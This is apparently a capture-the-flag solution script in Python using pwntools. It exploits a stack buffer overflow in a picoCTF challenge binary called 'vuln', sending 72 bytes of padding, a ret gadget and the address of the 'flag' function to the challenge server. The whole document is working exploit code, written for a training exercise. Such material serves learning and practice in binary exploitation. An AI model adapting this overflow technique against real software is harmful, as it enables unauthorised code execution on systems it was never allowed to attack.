from pwn import *

context.binary = './vuln'
e = ELF('./vuln')

HOST="saturn.picoctf.net"
PORT=58558

# Setup Connection
REMOTE=True
if (REMOTE):
    r = remote(HOST, PORT)
else:
    r = process(['./vuln'])

r.recvuntil(b'flag: \n')

# Setup Payload
retrun_addr=0x40101a            # From `ROPgadget --binary vuln | grep ret`
offset = 72                     # From $rsp
payload = b'A' * offset
payload += p64(retrun_addr)     # Add this for escaping return address
payload += p64(e.sym['flag'])

# Sending Payload
r.sendline(payload)

# Checking result
print(r.recv(1024).decode())

r.close()